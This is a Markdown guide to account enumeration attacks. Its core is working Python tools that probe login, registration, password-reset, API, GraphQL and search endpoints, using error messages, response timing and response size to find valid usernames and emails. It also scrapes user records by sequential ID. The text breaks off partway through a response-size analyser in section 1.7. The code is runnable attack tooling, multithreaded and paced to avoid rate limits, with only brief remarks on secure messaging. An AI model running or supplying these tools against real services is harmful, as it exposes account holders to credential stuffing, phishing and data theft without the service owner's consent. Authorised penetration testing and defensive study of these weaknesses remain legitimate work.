# Account Enumeration Attack Techniques

## Overview

Account enumeration allows attackers to discover valid usernames, email addresses, or other identifiers used by an application. This information can be leveraged for credential stuffing, spear phishing, or targeted attacks. This document covers comprehensive enumeration techniques, detection methods, and bypass strategies.

---

## 1. Enumeration Vectors

### 1.1 Login Endpoint Enumeration

**Description**: The most common enumeration vector, exploiting differences in application response when valid vs invalid credentials are submitted.

```python
#!/usr/bin/env python3
"""
Login Endpoint Enumeration Tool
Detects valid usernames through response analysis
"""

import requests
import time
import statistics
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class EnumerationResult:
    identifier: str
    exists: bool
    confidence: float
    indicators: List[str]
    response_time: float
    response_length: int
    status_code: int

class LoginEnumerator:
    def __init__(self, login_url: str, username_field: str = "email", password_field: str = "password"):
        self.login_url = login_url
        self.username_field = username_field
        self.password_field = password_field
        self.session = requests.Session()
        self.baseline_invalid = None
        self.baseline_valid = None

    def establish_baseline(self, known_invalid: str = "definitely_not_a_real_user_12345@fake.com",
                           known_valid: str = None) -> Dict:
        """Establish baseline responses for comparison"""

        # Invalid user baseline
        invalid_resp = self._make_request(known_invalid, "WrongPassword123!")
        self.baseline_invalid = {
            "status_code": invalid_resp.status_code,
            "response_length": len(invalid_resp.text),
            "response_time": invalid_resp.elapsed.total_seconds(),
            "response_text": invalid_resp.text,
            "headers": dict(invalid_resp.headers)
        }

        # Valid user baseline (if known)
        if known_valid:
            valid_resp = self._make_request(known_valid, "WrongPassword123!")
            self.baseline_valid = {
                "status_code": valid_resp.status_code,
                "response_length": len(valid_resp.text),
                "response_time": valid_resp.elapsed.total_seconds(),
                "response_text": valid_resp.text,
                "headers": dict(valid_resp.headers)
            }

        return {
            "invalid_baseline": self.baseline_invalid,
            "valid_baseline": self.baseline_valid
        }

    def _make_request(self, username: str, password: str) -> requests.Response:
        """Make login request"""
        payload = {
            self.username_field: username,
            self.password_field: password
        }

        return self.session.post(
            self.login_url,
            json=payload,
            headers={"Content-Type": "application/json"},
            allow_redirects=False
        )

    def analyze_response(self, username: str, password: str = "WrongPassword123!") -> EnumerationResult:
        """Analyze response for enumeration indicators"""
        start_time = time.time()
        resp = self._make_request(username, password)
        response_time = time.time() - start_time

        indicators = []
        confidence = 0.0

        if self.baseline_invalid:
            # Status code difference
            if resp.status_code != self.baseline_invalid["status_code"]:
                indicators.append(f"Status code differs: {resp.status_code} vs {self.baseline_invalid['status_code']}")
                confidence += 0.3

            # Response length difference
            length_diff = abs(len(resp.text) - self.baseline_invalid["response_length"])
            if length_diff > 10:
                indicators.append(f"Response length differs by {length_diff} bytes")
                confidence += 0.2

            # Response time difference
            time_diff = abs(response_time - self.baseline_invalid["response_time"])
            if time_diff > 0.1:  # 100ms difference
                indicators.append(f"Response time differs by {time_diff:.3f}s")
                confidence += 0.2

            # Error message analysis
            invalid_text = self.baseline_invalid["response_text"].lower()
            current_text = resp.text.lower()

            # Check for username-specific messages
            username_indicators = [
                "password is incorrect", "wrong password", "invalid password",
                "incorrect password", "password does not match",
                "account locked", "account disabled", "too many attempts"
            ]

            for indicator in username_indicators:
                if indicator in current_text and indicator not in invalid_text:
                    indicators.append(f"Username-specific message: '{indicator}'")
                    confidence += 0.4
                    break

            # Check for user-not-found messages (indicates invalid)
            not_found_indicators = [
                "user not found", "account not found", "no account",
                "email not registered", "username not found", "doesn't exist"
            ]

            for indicator in not_found_indicators:
                if indicator in current_text:
                    return EnumerationResult(
                        identifier=username,
                        exists=False,
                        confidence=0.9,
                        indicators=[f"Not found message: '{indicator}'"],
                        response_time=response_time,
                        response_length=len(resp.text),
                        status_code=resp.status_code
                    )

        # Header analysis
        if "X-Account-Locked" in resp.headers:
            indicators.append("X-Account-Locked header present")
            confidence += 0.5

        if "X-Rate-Limit-Remaining" in resp.headers:
            indicators.append("Rate limit header present")

        return EnumerationResult(
            identifier=username,
            exists=confidence >= 0.5,
            confidence=min(confidence, 1.0),
            indicators=indicators,
            response_time=response_time,
            response_length=len(resp.text),
            status_code=resp.status_code
        )

    def enumerate_list(self, usernames: List[str], threads: int = 5, delay: float = 0.5) -> List[EnumerationResult]:
        """Enumerate a list of usernames"""
        results = []

        with ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_username = {
                executor.submit(self.analyze_response, username): username
                for username in usernames
            }

            for future in as_completed(future_to_username):
                username = future_to_username[future]
                try:
                    result = future.result()
                    results.append(result)
                    if result.exists:
                        print(f"[+] FOUND: {result.identifier} (confidence: {result.confidence:.2f})")
                    time.sleep(delay)
                except Exception as e:
                    print(f"[-] Error for {username}: {e}")

        return results

# Response difference patterns to look for
ENUMERATION_PATTERNS = {
    "valid_user_indicators": [
        # Password-specific errors (indicates valid username)
        r"incorrect password",
        r"wrong password",
        r"invalid password",
        r"password (is |does not |doesn't )",
        r"authentication failed",
        r"bad password",

        # Account state indicators
        r"account (is )?(locked|disabled|suspended|blocked)",
        r"too many (failed )?(attempts|tries)",
        r"temporarily (locked|blocked)",
        r"please wait .* (minutes|seconds)",
        r"verify your email",
        r"account not (verified|activated)",
        r"2fa|two.factor|mfa|otp required",
    ],

    "invalid_user_indicators": [
        # User not found messages
        r"user (not found|doesn't exist|does not exist)",
        r"account (not found|doesn't exist|does not exist)",
        r"email (not found|not registered|doesn't exist)",
        r"no (user|account) (found |with )",
        r"(username|email|account) (is )?invalid",
        r"we (couldn't|could not) find",
        r"check your (email|username)",
    ],

    "generic_messages": [
        # Good security practice - same message for both
        r"invalid (username|email|credentials)( or password)?",
        r"login failed",
        r"authentication failed",
        r"incorrect (username|email|credentials)( or password)?",
    ]
}
```

---

### 1.2 Registration Endpoint Enumeration

**Description**: Registration forms often reveal if an email/username is already taken.

```python
#!/usr/bin/env python3
"""
Registration Endpoint Enumeration
Discovers existing accounts through registration checks
"""

import requests
import time
import re
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

class RegistrationEnumerator:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.check_endpoints = [
            "/api/register",
            "/api/signup",
            "/api/check-email",
            "/api/check-username",
            "/api/user/exists",
            "/api/validate-email",
            "/api/v1/users/check",
            "/register/check",
            "/signup/validate",
        ]

    def find_check_endpoint(self) -> Optional[str]:
        """Discover the registration check endpoint"""
        for endpoint in self.check_endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                # Try GET
                resp = self.session.get(url, timeout=5)
                if resp.status_code not in [404, 405]:
                    return url

                # Try POST
                resp = self.session.post(url, json={"email": "test@test.com"}, timeout=5)
                if resp.status_code not in [404, 405]:
                    return url
            except Exception:
                continue

        return None

    def check_email_exists(self, email: str, endpoint: str = None) -> Dict:
        """Check if email exists through registration endpoint"""
        endpoint = endpoint or f"{self.base_url}/api/register"

        # Method 1: Direct check endpoint
        check_resp = self._try_check_endpoint(email)
        if check_resp:
            return check_resp

        # Method 2: Registration attempt
        payload = {
            "email": email,
            "password": "TestPassword123!",
            "username": f"enum_test_{int(time.time())}"
        }

        try:
            resp = self.session.post(
                endpoint,
                json=payload,
                headers={"Content-Type": "application/json"}
            )

            exists_indicators = [
                "email already", "already registered", "already exists",
                "email is taken", "email in use", "account exists",
                "already have an account", "email is already"
            ]

            not_available = any(ind in resp.text.lower() for ind in exists_indicators)

            return {
                "email": email,
                "exists": not_available,
                "status_code": resp.status_code,
                "response": resp.text[:300],
                "method": "registration_attempt"
            }
        except Exception as e:
            return {"email": email, "error": str(e)}

    def _try_check_endpoint(self, email: str) -> Optional[Dict]:
        """Try dedicated check endpoints"""
        check_endpoints = [
            (f"{self.base_url}/api/check-email", {"email": email}),
            (f"{self.base_url}/api/users/check", {"email": email}),
            (f"{self.base_url}/api/validate", {"email": email}),
        ]

        for url, payload in check_endpoints:
            try:
                resp = self.session.post(url, json=payload, timeout=5)
                if resp.status_code == 200:
                    data = resp.json() if 'application/json' in resp.headers.get('content-type', '') else {}

                    # Check various response patterns
                    if "available" in data:
                        return {
                            "email": email,
                            "exists": not data["available"],
                            "method": "check_endpoint",
                            "endpoint": url
                        }
                    if "exists" in data:
                        return {
                            "email": email,
                            "exists": data["exists"],
                            "method": "check_endpoint",
                            "endpoint": url
                        }
            except Exception:
                continue

        return None

    def check_username_exists(self, username: str) -> Dict:
        """Check if username exists"""
        methods = [
            # Direct profile check
            (f"{self.base_url}/user/{username}", "GET", None),
            (f"{self.base_url}/profile/{username}", "GET", None),
            (f"{self.base_url}/@{username}", "GET", None),
            (f"{self.base_url}/u/{username}", "GET", None),

            # API checks
            (f"{self.base_url}/api/users/{username}", "GET", None),
            (f"{self.base_url}/api/check-username", "POST", {"username": username}),
            (f"{self.base_url}/api/username/available", "POST", {"username": username}),
        ]

        for url, method, payload in methods:
            try:
                if method == "GET":
                    resp = self.session.get(url, allow_redirects=False, timeout=5)
                else:
                    resp = self.session.post(url, json=payload, timeout=5)

                # Profile exists
                if resp.status_code == 200:
                    return {"username": username, "exists": True, "method": url}

                # Check JSON response
                if 'application/json' in resp.headers.get('content-type', ''):
                    data = resp.json()
                    if "available" in data:
                        return {"username": username, "exists": not data["available"], "method": url}
                    if "exists" in data:
                        return {"username": username, "exists": data["exists"], "method": url}

            except Exception:
                continue

        return {"username": username, "exists": None, "method": "unknown"}

    def enumerate_emails(self, emails: List[str], threads: int = 3, delay: float = 1.0) -> List[Dict]:
        """Enumerate list of emails"""
        results = []

        with ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_email = {
                executor.submit(self.check_email_exists, email): email
                for email in emails
            }

            for future in as_completed(future_to_email):
                email = future_to_email[future]
                try:
                    result = future.result()
                    results.append(result)
                    if result.get("exists"):
                        print(f"[+] EXISTS: {email}")
                    time.sleep(delay)
                except Exception as e:
                    print(f"[-] Error: {email} - {e}")

        return results


# AJAX endpoint discovery
class AjaxEndpointDiscovery:
    """Discover AJAX endpoints used for real-time validation"""

    COMMON_AJAX_PATTERNS = [
        # Email validation
        "/api/validate/email",
        "/api/email/check",
        "/api/email/validate",
        "/api/check-email",
        "/api/users/email/available",
        "/ajax/email-check",
        "/validate-email.json",

        # Username validation
        "/api/validate/username",
        "/api/username/check",
        "/api/check-username",
        "/api/users/username/available",
        "/ajax/username-check",
        "/validate-username.json",

        # Generic
        "/api/validate",
        "/api/check",
        "/api/available",
        "/graphql",  # Check for user query
    ]

    @staticmethod
    def extract_from_js(js_content: str) -> List[str]:
        """Extract validation endpoints from JavaScript"""
        patterns = [
            r'["\']([/\w-]*/(?:check|validate|available|exists)[/\w-]*)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.[a-z]+\(["\']([^"\']+)["\']',
            r'\$\.(ajax|get|post)\(["\']([^"\']+)["\']',
            r'url:\s*["\']([^"\']+)["\']',
        ]

        endpoints = set()
        for pattern in patterns:
            matches = re.findall(pattern, js_content)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[-1]  # Get last group
                if '/api' in match or 'check' in match or 'validate' in match:
                    endpoints.add(match)

        return list(endpoints)
```

---

### 1.3 Password Reset Endpoint Enumeration

**Description**: Password reset functionality often reveals valid accounts through differentiated responses.

```python
#!/usr/bin/env python3
"""
Password Reset Enumeration
Discover valid accounts through password reset responses
"""

import requests
import time
import re
from typing import Dict, List, Optional
from dataclasses import dataclass

@dataclass
class ResetEnumResult:
    identifier: str
    exists: bool
    confidence: float
    response_time: float
    status_code: int
    message: str
    indicators: List[str]

class PasswordResetEnumerator:
    def __init__(self, reset_url: str, email_field: str = "email"):
        self.reset_url = reset_url
        self.email_field = email_field
        self.session = requests.Session()
        self.baseline = None

    def establish_baseline(self, invalid_email: str = "nonexistent_user_xyz123@fake.com") -> Dict:
        """Establish baseline for invalid user"""
        start = time.time()
        resp = self._make_request(invalid_email)
        elapsed = time.time() - start

        self.baseline = {
            "status_code": resp.status_code,
            "response_length": len(resp.text),
            "response_time": elapsed,
            "response_text": resp.text,
            "headers": dict(resp.headers)
        }

        return self.baseline

    def _make_request(self, email: str) -> requests.Response:
        """Make password reset request"""
        return self.session.post(
            self.reset_url,
            json={self.email_field: email},
            headers={"Content-Type": "application/json"}
        )

    def check_account(self, email: str) -> ResetEnumResult:
        """Check if account exists via password reset"""
        start = time.time()
        resp = self._make_request(email)
        elapsed = time.time() - start

        indicators = []
        confidence = 0.0
        exists = False

        text = resp.text.lower()

        # Positive indicators (account exists)
        valid_patterns = [
            (r"email (has been |was )?sent", 0.8),
            (r"check your (email|inbox)", 0.7),
            (r"reset (link|instructions|email)", 0.6),
            (r"password reset", 0.5),
            (r"we('ve| have) sent", 0.8),
            (r"if.*(account|email).*exists.*sent", 0.3),  # Generic but suggests processing
        ]

        for pattern, weight in valid_patterns:
            if re.search(pattern, text):
                indicators.append(f"Pattern matched: {pattern}")
                confidence += weight
                exists = True

        # Negative indicators (account doesn't exist)
        invalid_patterns = [
            (r"(email|account|user).*(not found|doesn't exist|does not exist)", 0.9),
            (r"no (account|user) (found |with |for )", 0.9),
            (r"(email|account) (is )?not registered", 0.9),
            (r"we (couldn't|could not|cannot) find", 0.8),
        ]

        for pattern, weight in invalid_patterns:
            if re.search(pattern, text):
                indicators.append(f"Not found pattern: {pattern}")
                confidence = weight
                exists = False
                break

        # Compare with baseline
        if self.baseline:
            # Response length difference
            length_diff = abs(len(resp.text) - self.baseline["response_length"])
            if length_diff > 50:
                indicators.append(f"Response length differs by {length_diff}")
                confidence += 0.2
                exists = True

            # Response time difference (valid accounts often take longer due to email sending)
            time_diff = elapsed - self.baseline["response_time"]
            if time_diff > 0.5:  # 500ms longer
                indicators.append(f"Response time {time_diff:.2f}s longer (email being sent?)")
                confidence += 0.3
                exists = True

            # Status code difference
            if resp.status_code != self.baseline["status_code"]:
                indicators.append(f"Status code differs: {resp.status_code}")
                confidence += 0.2

        return ResetEnumResult(
            identifier=email,
            exists=exists and confidence > 0.5,
            confidence=min(confidence, 1.0),
            response_time=elapsed,
            status_code=resp.status_code,
            message=resp.text[:200],
            indicators=indicators
        )

    def enumerate_emails(self, emails: List[str], delay: float = 2.0) -> List[ResetEnumResult]:
        """Enumerate list of emails via password reset"""
        if not self.baseline:
            self.establish_baseline()

        results = []
        for email in emails:
            result = self.check_account(email)
            results.append(result)

            if result.exists:
                print(f"[+] FOUND: {email} (confidence: {result.confidence:.2f})")
                for indicator in result.indicators:
                    print(f"    - {indicator}")

            time.sleep(delay)  # Longer delay to avoid rate limits and email spam

        return results


# Common response patterns
RESET_RESPONSE_PATTERNS = {
    "valid_account": [
        "password reset email has been sent",
        "check your email for reset instructions",
        "we've sent a reset link",
        "reset link sent to your email",
        "please check your inbox",
        "email with instructions has been sent",
    ],

    "invalid_account": [
        "email address not found",
        "no account with this email",
        "user does not exist",
        "email not registered",
        "we couldn't find an account",
        "this email is not associated with any account",
    ],

    "generic_good": [
        # These indicate good security practice
        "if an account exists, an email will be sent",
        "if the email is registered, you'll receive instructions",
        "we'll send a reset link if the account exists",
    ]
}
```

---

### 1.4 API Endpoint Enumeration

**Description**: API endpoints may expose user information directly or through ID enumeration.

```python
#!/usr/bin/env python3
"""
API Endpoint Enumeration
Discover users through API endpoints
"""

import requests
import time
from typing import Dict, List, Optional, Generator
from concurrent.futures import ThreadPoolExecutor, as_completed

class APIEnumerator:
    def __init__(self, base_url: str, auth_token: str = None):
        self.base_url = base_url
        self.session = requests.Session()
        if auth_token:
            self.session.headers["Authorization"] = f"Bearer {auth_token}"

    def enumerate_user_ids(self, start_id: int = 1, end_id: int = 1000) -> List[Dict]:
        """Enumerate users by sequential IDs"""
        results = []

        endpoints = [
            "/api/users/{id}",
            "/api/user/{id}",
            "/api/v1/users/{id}",
            "/api/v2/users/{id}",
            "/api/profiles/{id}",
            "/api/members/{id}",
            "/users/{id}.json",
        ]

        for user_id in range(start_id, end_id + 1):
            for endpoint in endpoints:
                url = f"{self.base_url}{endpoint.format(id=user_id)}"
                try:
                    resp = self.session.get(url, timeout=5)
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            results.append({
                                "id": user_id,
                                "endpoint": endpoint,
                                "data": data
                            })
                            print(f"[+] Found user {user_id}: {data.get('email', data.get('username', 'N/A'))}")
                            break  # Found valid endpoint, move to next ID
                        except:
                            pass
                except Exception:
                    continue

            time.sleep(0.1)

        return results

    def enumerate_by_username(self, usernames: List[str]) -> List[Dict]:
        """Enumerate users by username through various endpoints"""
        results = []

        endpoints = [
            "/api/users/username/{username}",
            "/api/users?username={username}",
            "/api/user/{username}",
            "/api/profiles/{username}",
            "/@{username}",
            "/u/{username}",
            "/users/{username}",
        ]

        for username in usernames:
            for endpoint in endpoints:
                url = f"{self.base_url}{endpoint.format(username=username)}"
                try:
                    resp = self.session.get(url, timeout=5)
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            results.append({
                                "username": username,
                                "endpoint": endpoint,
                                "data": data
                            })
                            print(f"[+] Found: {username}")
                            break
                        except:
                            # HTML response - profile exists
                            results.append({
                                "username": username,
                                "endpoint": endpoint,
                                "exists": True
                            })
                            break
                except Exception:
                    continue

            time.sleep(0.2)

        return results

    def search_api_enumeration(self, search_terms: List[str]) -> List[Dict]:
        """Use search API to enumerate users"""
        results = []

        search_endpoints = [
            "/api/search?q={term}&type=user",
            "/api/search/users?q={term}",
            "/api/users/search?query={term}",
            "/api/v1/search?term={term}",
            "/api/autocomplete?q={term}",
            "/api/users/autocomplete?q={term}",
        ]

        for term in search_terms:
            for endpoint in search_endpoints:
                url = f"{self.base_url}{endpoint.format(term=term)}"
                try:
                    resp = self.session.get(url, timeout=5)
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            if isinstance(data, list) and len(data) > 0:
                                results.extend(data)
                                print(f"[+] Search '{term}' returned {len(data)} results")
                            elif isinstance(data, dict) and 'users' in data:
                                results.extend(data['users'])
                                print(f"[+] Search '{term}' returned {len(data['users'])} results")
                        except:
                            pass
                except Exception:
                    continue

            time.sleep(0.5)

        return results

    def graphql_enumeration(self) -> Dict:
        """Enumerate users via GraphQL introspection and queries"""
        graphql_url = f"{self.base_url}/graphql"

        # Introspection query
        introspection = """
        query {
          __schema {
            types {
              name
              fields {
                name
                type { name }
              }
            }
          }
        }
        """

        # Common user queries
        user_queries = [
            '{ users { id email username } }',
            '{ user(id: 1) { id email username } }',
            '{ allUsers { edges { node { id email username } } } }',
            '{ searchUsers(query: "a") { id email username } }',
            '{ me { id email } }',  # Might leak authenticated user info
        ]

        results = {"introspection": None, "user_data": []}

        # Try introspection
        try:
            resp = self.session.post(
                graphql_url,
                json={"query": introspection},
                headers={"Content-Type": "application/json"}
            )
            if resp.status_code == 200:
                results["introspection"] = resp.json()
        except:
            pass

        # Try user queries
        for query in user_queries:
            try:
                resp = self.session.post(
                    graphql_url,
                    json={"query": query},
                    headers={"Content-Type": "application/json"}
                )
                if resp.status_code == 200:
                    data = resp.json()
                    if 'data' in data and not data.get('errors'):
                        results["user_data"].append({
                            "query": query,
                            "data": data['data']
                        })
            except:
                continue

        return results

    def enumerate_uuid(self, known_uuid: str = None) -> Dict:
        """Information about UUID enumeration"""
        return {
            "description": "UUID enumeration when sequential/predictable",
            "techniques": [
                {
                    "name": "UUID v1 time-based",
                    "description": "UUIDv1 contains timestamp - generate UUIDs for time window",
                    "example": "If target registered around 2024-01-15, generate UUIDs for that period"
                },
                {
                    "name": "UUID version detection",
                    "description": "Check UUID version to determine attack approach",
                    "versions": {
                        "v1": "Time-based - predictable based on timestamp",
                        "v4": "Random - not enumerable but check for weak PRNG",
                        "v5": "Name-based - if salt is known, can predict"
                    }
                }
            ],
            "sample_code": """
import uuid
from datetime import datetime

# Generate UUIDv1 for specific timestamp
def uuid1_for_timestamp(timestamp):
    # UUIDv1 contains 100-nanosecond intervals since Oct 15, 1582
    # This is simplified - actual implementation needs clock_seq and node
    return uuid.uuid1()

# Check UUID version
def get_uuid_version(uuid_str):
    u = uuid.UUID(uuid_str)
    return u.version
"""
        }
```

---

### 1.5 Error Message Analysis

**Description**: Detailed error messages can reveal whether credentials are partially correct.

```python
#!/usr/bin/env python3
"""
Error Message Analysis for Enumeration
Analyze application error messages for user enumeration
"""

import requests
import re
from typing import Dict, List, Tuple
from difflib import SequenceMatcher

class ErrorMessageAnalyzer:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.error_patterns = {}

    def collect_error_messages(self, endpoints: Dict[str, Dict]) -> Dict:
        """Collect error messages from various endpoints"""
        messages = {}

        for name, config in endpoints.items():
            url = f"{self.base_url}{config['path']}"
            messages[name] = {
                "valid_user_invalid_pass": None,
                "invalid_user": None,
                "empty_fields": None,
                "special_chars": None
            }

            # Test with likely valid format but invalid user
            resp = self.session.post(url, json={
                config['user_field']: "nonexistent_user@fake.com",
                config['pass_field']: "SomePassword123!"
            })
            messages[name]["invalid_user"] = self._extract_error(resp)

            # Test with empty fields
            resp = self.session.post(url, json={
                config['user_field']: "",
                config['pass_field']: ""
            })
            messages[name]["empty_fields"] = self._extract_error(resp)

            # Test with special characters
            resp = self.session.post(url, json={
                config['user_field']: "test'\"<>@fake.com",
                config['pass_field']: "test'\"<>"
            })
            messages[name]["special_chars"] = self._extract_error(resp)

        return messages

    def _extract_error(self, response: requests.Response) -> Dict:
        """Extract error message from response"""
        result = {
            "status_code": response.status_code,
            "full_text": response.text[:500],
            "extracted_message": None
        }

        # Try JSON error
        try:
            data = response.json()
            for key in ['error', 'message', 'msg', 'detail', 'errors']:
                if key in data:
                    result["extracted_message"] = data[key]
                    break
        except:
            pass

        # Try HTML error
        if not result["extracted_message"]:
            patterns = [
                r'<div[^>]*class="[^"]*error[^"]*"[^>]*>([^<]+)</div>',
                r'<span[^>]*class="[^"]*error[^"]*"[^>]*>([^<]+)</span>',
                r'<p[^>]*class="[^"]*error[^"]*"[^>]*>([^<]+)</p>',
                r'"error":\s*"([^"]+)"',
                r'"message":\s*"([^"]+)"',
            ]

            for pattern in patterns:
                match = re.search(pattern, response.text)
                if match:
                    result["extracted_message"] = match.group(1)
                    break

        return result

    def compare_messages(self, msg1: str, msg2: str) -> Dict:
        """Compare two error messages for differences"""
        similarity = SequenceMatcher(None, msg1 or "", msg2 or "").ratio()

        return {
            "message1": msg1,
            "message2": msg2,
            "similarity": similarity,
            "different": similarity < 0.95,
            "diff_details": self._get_diff_details(msg1, msg2)
        }

    def _get_diff_details(self, msg1: str, msg2: str) -> List[str]:
        """Get detailed differences between messages"""
        if not msg1 or not msg2:
            return ["One message is empty"]

        diffs = []

        # Length difference
        if len(msg1) != len(msg2):
            diffs.append(f"Length differs: {len(msg1)} vs {len(msg2)}")

        # Word differences
        words1 = set(msg1.lower().split())
        words2 = set(msg2.lower().split())

        only_in_1 = words1 - words2
        only_in_2 = words2 - words1

        if only_in_1:
            diffs.append(f"Words only in first: {only_in_1}")
        if only_in_2:
            diffs.append(f"Words only in second: {only_in_2}")

        return diffs

    def generate_report(self, messages: Dict) -> str:
        """Generate analysis report"""
        report = "# Error Message Analysis Report\n\n"

        for endpoint, errors in messages.items():
            report += f"## {endpoint}\n\n"

            if errors.get("invalid_user") and errors.get("valid_user_invalid_pass"):
                comparison = self.compare_messages(
                    errors["invalid_user"].get("extracted_message"),
                    errors["valid_user_invalid_pass"].get("extracted_message")
                )

                if comparison["different"]:
                    report += "**VULNERABLE**: Different error messages for valid vs invalid users\n\n"
                    report += f"- Invalid user: `{comparison['message1']}`\n"
                    report += f"- Valid user, wrong password: `{comparison['message2']}`\n\n"
                else:
                    report += "**SECURE**: Same error message for both cases\n\n"

            report += "---\n\n"

        return report


# Common enumeration-revealing error messages
VULNERABLE_ERROR_PATTERNS = {
    "user_specific": [
        # These indicate the username exists
        "incorrect password",
        "wrong password",
        "invalid password",
        "password is incorrect",
        "the password you entered is incorrect",
        "account locked",
        "too many failed attempts",
        "please verify your email",
        "account not verified",
        "account disabled",
        "account suspended",
    ],

    "user_not_found": [
        # These indicate the username doesn't exist
        "user not found",
        "account not found",
        "email not found",
        "no account with this email",
        "user does not exist",
        "invalid username",
        "username not found",
        "we couldn't find that account",
    ],

    "generic_secure": [
        # These are secure - don't reveal user existence
        "invalid credentials",
        "invalid username or password",
        "incorrect email or password",
        "login failed",
        "authentication failed",
        "invalid email or password",
    ]
}
```

---

### 1.6 Timing Analysis

**Description**: Exploiting time differences in server responses to determine valid accounts.

```python
#!/usr/bin/env python3
"""
Timing-Based User Enumeration
Detect valid users through response time analysis
"""

import requests
import time
import statistics
from typing import Dict, List, Tuple
from concurrent.futures import ThreadPoolExecutor
import numpy as np

class TimingEnumerator:
    def __init__(self, target_url: str, username_field: str = "email", password_field: str = "password"):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.session = requests.Session()

    def measure_response_time(self, username: str, password: str = "WrongPassword123!", iterations: int = 5) -> Dict:
        """Measure response time for a username over multiple iterations"""
        times = []

        for _ in range(iterations):
            payload = {
                self.username_field: username,
                self.password_field: password
            }

            start = time.perf_counter()
            try:
                resp = self.session.post(
                    self.target_url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=30
                )
                elapsed = time.perf_counter() - start
                times.append(elapsed)
            except Exception as e:
                continue

            time.sleep(0.1)  # Small delay between requests

        if not times:
            return {"username": username, "error": "All requests failed"}

        return {
            "username": username,
            "times": times,
            "mean": statistics.mean(times),
            "median": statistics.median(times),
            "stdev": statistics.stdev(times) if len(times) > 1 else 0,
            "min": min(times),
            "max": max(times)
        }

    def establish_baseline(self, count: int = 10) -> Dict:
        """Establish timing baseline with definitely invalid users"""
        baseline_times = []

        for i in range(count):
            username = f"definitely_invalid_user_{i}_{int(time.time())}@fake.com"
            result = self.measure_response_time(username, iterations=3)
            if "mean" in result:
                baseline_times.append(result["mean"])

        if not baseline_times:
            return {"error": "Could not establish baseline"}

        return {
            "mean": statistics.mean(baseline_times),
            "stdev": statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0,
            "threshold": statistics.mean(baseline_times) + (2 * statistics.stdev(baseline_times)) if len(baseline_times) > 1 else statistics.mean(baseline_times) * 1.5
        }

    def enumerate_with_timing(self, usernames: List[str], baseline: Dict = None) -> List[Dict]:
        """Enumerate users based on timing differences"""
        if not baseline:
            print("[*] Establishing timing baseline...")
            baseline = self.establish_baseline()
            print(f"[*] Baseline: mean={baseline['mean']:.3f}s, threshold={baseline['threshold']:.3f}s")

        results = []

        for username in usernames:
            result = self.measure_response_time(username)

            if "mean" in result:
                # Check if timing is significantly different from baseline
                time_diff = result["mean"] - baseline["mean"]
                is_suspicious = result["mean"] > baseline["threshold"]

                result["time_diff"] = time_diff
                result["suspicious"] = is_suspicious
                result["baseline_mean"] = baseline["mean"]
                result["threshold"] = baseline["threshold"]

                if is_suspicious:
                    print(f"[+] SUSPICIOUS: {username} - mean={result['mean']:.3f}s (diff={time_diff:.3f}s)")

            results.append(result)
            time.sleep(0.2)

        return results

    def statistical_analysis(self, results: List[Dict]) -> Dict:
        """Perform statistical analysis on timing results"""
        valid_results = [r for r in results if "mean" in r]

        if len(valid_results) < 2:
            return {"error": "Not enough valid results for analysis"}

        times = [r["mean"] for r in valid_results]

        # Calculate z-scores
        mean_time = statistics.mean(times)
        stdev_time = statistics.stdev(times)

        for result in valid_results:
            if stdev_time > 0:
                result["z_score"] = (result["mean"] - mean_time) / stdev_time
            else:
                result["z_score"] = 0

        # Identify outliers (z-score > 2)
        outliers = [r for r in valid_results if abs(r.get("z_score", 0)) > 2]

        return {
            "total_tested": len(valid_results),
            "mean_time": mean_time,
            "stdev_time": stdev_time,
            "outliers": outliers,
            "outlier_usernames": [o["username"] for o in outliers]
        }


class AdvancedTimingAnalysis:
    """Advanced timing analysis techniques"""

    @staticmethod
    def password_hash_timing(login_url: str, valid_user: str, session: requests.Session) -> Dict:
        """
        Detect timing differences in password hashing
        Valid users trigger hash comparison, invalid users may not
        """
        # Short password (fast to hash)
        short_times = []
        for _ in range(5):
            start = time.perf_counter()
            session.post(login_url, json={"email": valid_user, "password": "a"})
            short_times.append(time.perf_counter() - start)

        # Long password (slow to hash)
        long_pass = "a" * 1000
        long_times = []
        for _ in range(5):
            start = time.perf_counter()
            session.post(login_url, json={"email": valid_user, "password": long_pass})
            long_times.append(time.perf_counter() - start)

        short_mean = statistics.mean(short_times)
        long_mean = statistics.mean(long_times)

        return {
            "short_password_mean": short_mean,
            "long_password_mean": long_mean,
            "difference": long_mean - short_mean,
            "vulnerable": (long_mean - short_mean) > 0.05  # 50ms difference
        }

    @staticmethod
    def database_lookup_timing(login_url: str, session: requests.Session) -> Dict:
        """
        Detect timing differences in database lookups
        Different response times for existing vs non-existing users
        """
        # Non-existent users (fast - no DB hit or early return)
        nonexistent_times = []
        for i in range(10):
            user = f"definitely_not_real_{i}_{time.time()}@fake.com"
            start = time.perf_counter()
            session.post(login_url, json={"email": user, "password": "test"})
            nonexistent_times.append(time.perf_counter() - start)

        return {
            "nonexistent_mean": statistics.mean(nonexistent_times),
            "nonexistent_stdev": statistics.stdev(nonexistent_times) if len(nonexistent_times) > 1 else 0,
            "detection_threshold": statistics.mean(nonexistent_times) + (3 * statistics.stdev(nonexistent_times)) if len(nonexistent_times) > 1 else statistics.mean(nonexistent_times) * 1.5
        }
```

---

### 1.7 Response Size Analysis

**Description**: Detecting valid accounts through differences in response size.

```python
#!/usr/bin/env python3
"""
Response Size Analysis for User Enumeration
Detect valid users through response body/header size differences
"""

import requests
import statistics
from typing import Dict, List
from collections import Counter

class ResponseSizeAnalyzer:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()

    def analyze_response_sizes(self, usernames: List[str], password: str = "WrongPassword123!") -> Dict:
        """Analyze response sizes for a list of usernames"""
        results = []

        for username in usernames:
            payload = {
                "email": username,
